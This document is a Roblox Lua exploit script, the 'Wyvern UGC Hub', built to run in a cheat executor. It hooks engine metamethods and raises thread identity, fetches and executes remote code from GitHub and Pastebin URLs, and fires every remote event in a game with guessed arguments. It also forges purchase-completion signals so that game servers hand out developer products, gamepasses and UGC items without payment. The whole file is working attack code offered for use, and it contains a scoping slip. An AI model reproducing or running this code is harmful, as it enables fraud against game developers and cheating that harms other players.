local LOAD_TIME = tick()
local queueonteleport = queue_on_teleport or queueonteleport
local setclipboard = toclipboard or setrbxclipboard or setclipboard
local clonefunction = clonefunc or clonefunction
local hookfunction =
    hookfunc or replacecclosure or detourfunction or replacefunc or replacefunction or replaceclosure or detour_function or
        hookfunction
local setthreadidentity = set_thread_identity or setthreadcaps or setthreadidentity
local firetouchinterests = fire_touch_interests or firetouchinterests
local getnamecallmethod = get_namecall_method or getnamecallmethod
local setnamecallmethod = set_namecall_method or setnamecallmethod
local restorefunction = restorefunction or restoreclosure or restorefunc
local a = Instance.new("Part")
for b, c in pairs(getreg()) do
    if type(c) == "table" and #c then
        if rawget(c, "__mode") == "kvs" then
            for d, e in pairs(c) do
                if e == a then
                    getgenv().InstanceList = c;
                    break
                end
            end
        end
    end
end
local f = {}
function f.invalidate(g)
    if not InstanceList then
        return
    end
    for b, c in pairs(InstanceList) do
        if c == g then
            InstanceList[b] = nil;
            return g
        end
    end
end
if not cloneref then
    getgenv().cloneref = f.invalidate
end

getrenv().Visit = cloneref(game:GetService("Visit"))
getrenv().MarketplaceService = cloneref(game:GetService("MarketplaceService"))
getrenv().HttpRbxApiService = cloneref(game:GetService("HttpRbxApiService"))
getrenv().HttpService = cloneref(game:GetService("HttpService"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local ContentProvider = cloneref(game:GetService("ContentProvider"))
local RunService = cloneref(game:GetService("RunService"))
local Stats = cloneref(game:GetService("Stats"))
local Players = cloneref(game:GetService("Players"))
local NetworkClient = cloneref(game:GetService("NetworkClient"))
local VirtualUser = cloneref(game:GetService("VirtualUser"))
local ProximityPromptService = cloneref(game:GetService("ProximityPromptService"))
local Lighting = cloneref(game:GetService("Lighting"))
local AssetService = cloneref(game:GetService("AssetService"))
local TeleportService = cloneref(game:GetService("TeleportService"))
local NetworkSettings = settings().Network
local UserGameSettings = UserSettings():GetService("UserGameSettings")
getrenv().getgenv = clonefunction(getgenv)

local message = Instance.new("Message")
message.Text = "Loading Wyvern Succesfully"
message.Name =
    "Rass Goblin"
message.Parent = CoreGui

task.wait(0.25)

getgenv().stealth_call = function(script)
    getrenv()._set = clonefunction(setthreadidentity)
    local old
    old = hookmetamethod(game, "__index", function(a, b)
        task.spawn(function()
            _set(7)
            task.wait(0.1)
            local went, error = pcall(function()
                loadstring(script)()
            end)
            print(went, error)
            if went then
                local check = Instance.new("LocalScript")
                check.Parent = Visit
            end
        end)
        hookmetamethod(game, "__index", old)
        return old(a, b)
    end)
end

task.spawn(function()
    local discord = loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/WyvernMenu",true))()
    local win = discord:Window("Wyvern UGC Hub v3 - Remaker by xsohe")
    local serv = win:Server("Wyvern Hub", "http://www.roblox.com/asset/?id=6031075938")
    local main = serv:Channel("Home")
    main:Label("\nThank you for using Wyvern!\nThe #2 UGC Games Penetration Testing Tool! (mine is still better)")
    main:Label("Check out the other Discord channels to see our available tools!")
    main:Seperator()
    main:Toggle("Anti Kick (Client)", false, function(bool)
        if bool == "true" then
            local kick;
            kick = hookmetamethod(game, "__namecall", function(obj, ...)
                local args = {...}
                local method = getnamecallmethod()
                if method == "Kick" then
                    if args[1] then
                        discord:Notification("Kick Attempt", "There was an attempt to kick player from client.", "Okay.")
                    end
                    return nil
                end
                return kick(obj, unpack(args))
            end)
        end
    end)
    main:Seperator()
    main:Button("Update Logs", function()
        discord:Notification("Updates", "...", "Okay!")
    end)
    main:Button("Credits", function()
        discord:Notification("Credits", "i forgot, will be putting soon", "Okay!")
    end)

    local remotes = serv:Channel("Remotes")
    remotes:Label("\nFires all remotes in the game as an attempt to prompt the item.\nWarning: This can be risky and can fire a decoy remote!\n")
    remotes:Textbox("UGC Limited Item ID", "Enter Item ID that you wanna be included in the arguments...", false,
        function(t)
            local tt = tonumber(t)
            if type(tt) == "number" then
                getgenv().limitedidforfiringremotewithwyvern = tt
                discord:Notification("Success",
                    "The script now remembers that the Item ID you want is " .. tostring(tt) .. "!", "Okay!")
            else
                discord:Notification("Error", "That's... not an Item ID.", "Okay!")
            end
        end)
    remotes:Dropdown("Remote Arguments...",
        {"No Arguments/Blank", "LocalPlayer", "Your Username", "UGC Item ID", "UGC Item ID, LocalPlayer",
         "LocalPlayer, UGC Item ID", "'UGC' as a string", "UGC Item ID, 'true' boolean", "'true' boolean",
         "literal lua code to prompt item", "loadstring prompt item"}, function(x)
            if not getgenv().limitedidforfiringremotewithwyvern then
                discord:Notification("Error",
                    "You must put a Limited Item ID at the first textbox before firing... Or just set it to blank if you're using this not for the purpose of UGC hunting.",
                    "Okay!")
            else
                local id = getgenv().limitedidforfiringremotewithwyvern
                local fire = function(args)
                    local count = 0
                    for i, v in pairs(game:GetDescendants()) do
                        if v:IsA("RemoteEvent") or v:IsA("UnreliableRemoteEvent") then
                            count = count + 1
                            task.spawn(function()
                                v:FireServer(unpack(args))
                            end)
                        end
                    end
                    discord:Notification("Remote Fired", "Fired " .. tostring(count) .. " remotes with arguments: " .. tostring(table.concat(args, ", ")), "Okay!")
                end
                if x == "No Arguments/Blank" then
                    fire({})
                elseif x == "LocalPlayer" then
                    fire({Players.LocalPlayer})
                elseif x == "Your Username" then
                    fire({Players.LocalPlayer.Name})
                elseif x == "UGC Item ID" then
                    fire({id})
                elseif x == "UGC Item ID, LocalPlayer" then
                    fire({id, Players.LocalPlayer})
                elseif x == "LocalPlayer, UGC Item ID" then
                    fire({Players.LocalPlayer, id})
                elseif x == "'UGC' as a string" then
                    fire({"UGC"})
                elseif x == "UGC Item ID, 'true' boolean" then
                    fire({id, true})
                elseif x == "'true' boolean" then
                    fire({true})
                elseif x == "literal lua code to prompt item" then
                    fire({"loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))()"})
                elseif x == "loadstring prompt item" then
                    fire({loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))})
                end
            end
        end)

    main:Seperator()
    main:Button("Update Logs", function()
        discord:Notification("Updates", "...", "Okay!")
    end)
    main:Button("Credits", function()
        discord:Notification("Credits", "i forgot, will be putting soon", "Okay!")
    end)
end)

local purchase = serv:Channel("Purchase Exploit")

purchase:Label("Fake Purchaser!\nThis tricks server that you bought a DevProduct!")
purchase:Label("Only works in some games...")
purchase:Label("Loop starts when the button to fire is pressed")

purchase:Toggle("Loop Purchases (Rejoin To Stop)", false, function(bool)
    if bool then
        getgenv().wyvernlooppurchases = true
    else
        getgenv().wyvernlooppurchases = false
        local killswitch = Instance.new("Script")
        killswitch.Parent = Visit
    end
end)

local dnames = {}
local dproductIds = {}

local success, x_x = pcall(function()
    return HttpService:JSONDecode(game:HttpGet("https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" .. game.GameId .. "&page=1"))
end)

if success and x_x.DeveloperProducts then
    for _, developerProduct in pairs(x_x.DeveloperProducts) do
        table.insert(dnames, developerProduct.Name)
        table.insert(dproductIds, developerProduct.ProductId)
    end
end

purchase:Dropdown("Below is a list of all DevProducts in this game!", dnames, function(x)
    for i, name in ipairs(dnames) do
        if name == x then
            index = i
            break
        end
    end
end)

purchase:Label("If nothing shows above, no DevProducts found.")

purchase:Button("Fire Selected Dev Product!", function()
    if index then
        local product = dproductIds[index]
        pcall(function()
            stealth_call('if getgenv().wyvernlooppurchases then while task.wait() do if Visit:FindFirstChild("Script") then break end MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' .. product .. ', true) end else MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' .. product .. ', true) end')
        end)
        task.wait(0.2)
        if not Visit:FindFirstChild("LocalScript") then
            discord:Notification("Error", "Your executor blocked function SignalPromptProductPurchaseFinished.", "Okay!")
        else
            discord:Notification("Success", "Fired PromptProductPurchaseFinished signal to server with productId: " .. tostring(product), "Okay!")
            Visit:FindFirstChild("LocalScript"):Destroy()
        end
    else
        discord:Notification("Error", "Something went wrong but I don't know what.", "Okay!")
    end
end)

purchase:Button("Fire All Dev Products", function()
    getrenv()._set = clonefunction(setthreadidentity)
    local starttickcc = tick()
    for i, product in pairs(dproductIds) do
        task.spawn(function()
            pcall(function()
                stealth_call('if getgenv().wyvernlooppurchases then while task.wait() do if Visit:FindFirstChild("Script") then break end MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' .. product .. ', true) end else MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' .. product .. ', true) end')
            end)
        end)
        task.wait()
    end
    local endtickcc = tick()
    local durationxd = endtickcc - starttickcc
    discord:Notification("Success", "Fired all developer products in " .. tostring(durationxd) .. " seconds.", "Okay!")
end)

purchase:Seperator()
purchase:Label("Pretty much the same as the one above but for gamepass")

local wyverngamepass = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.GameId .. "/game-passes?limit=100&sortOrder=1"))
local gnames = {}
local gproductIds = {}

for i, v in pairs(wyverngamepass.data) do
    table.insert(gnames, v.name)
    table.insert(gproductIds, v.id)
end

local gamepass
purchase:Dropdown("Below is a list of all GamePass in this game!", gnames, function(x)
    for i, name in ipairs(gnames) do
        if name == x then
            gamepass = gproductIds[i]
            break
        end
    end
end)

purchase:Label("If nothing shows above, no GamePass found.")

purchase:Button("Fire Selected Gamepass", function()
    if gamepass then
        pcall(function()
            stealth_call('MarketplaceService:SignalPromptGamePassPurchaseFinished(game.Players.LocalPlayer, ' .. tostring(gamepass) .. ', true)')
        end)
        task.wait(0.2)
        if not Visit:FindFirstChild("LocalScript") then
            discord:Notification("Error", "Your executor blocked function SignalPromptGamePassPurchaseFinished.", "Okay!")
        else
            discord:Notification("Success", "Fired PromptProductGamePassPurchaseFinished signal to server with productId: " .. tostring(gamepass), "Okay!")
            Visit:FindFirstChild("LocalScript"):Destroy()
        end
    else
        discord:Notification("Error", "Something went wrong but I don't know what.", "Okay!")
    end
end)

purchase:Seperator()
purchase:Label("Signals to server that an item purchase failed.")
purchase:Label("This can trick servers to reprompt an item!")

local returnvalprompt = false
purchase:Toggle("Item Purchase Success Return Value", returnvalprompt, function(bool)
    returnvalprompt = bool
end)

purchase:Textbox("Item ID of the UGC item", "Enter the Item ID...", false, function(t)
    local tt = tonumber(t)
    if type(tt) == "number" then
        pcall(function()
            stealth_call('MarketplaceService:SignalPromptPurchaseFinished(game.Players.LocalPlayer, ' .. tt .. ', false) MarketplaceService:SignalPromptPurchaseFinished(game.Players.LocalPlayer, ' .. tt .. ', ' .. tostring(returnvalprompt) .. ')')
        end)
        task.wait(0.2)
        if not Visit:FindFirstChild("LocalScript") then
            discord:Notification("Error", "Your executor blocked function SignalPromptPurchaseFinished.", "Okay!")
        else
            discord:Notification("Success", "Fired signal PromptPurchaseFinished with bool false and productId: " .. tostring(tt), "Okay!")
            Visit:FindFirstChild("LocalScript"):Destroy()
        end
    else
        discord:Notification("Error", "That's... Not an Item ID.", "Okay!")
    end
end)
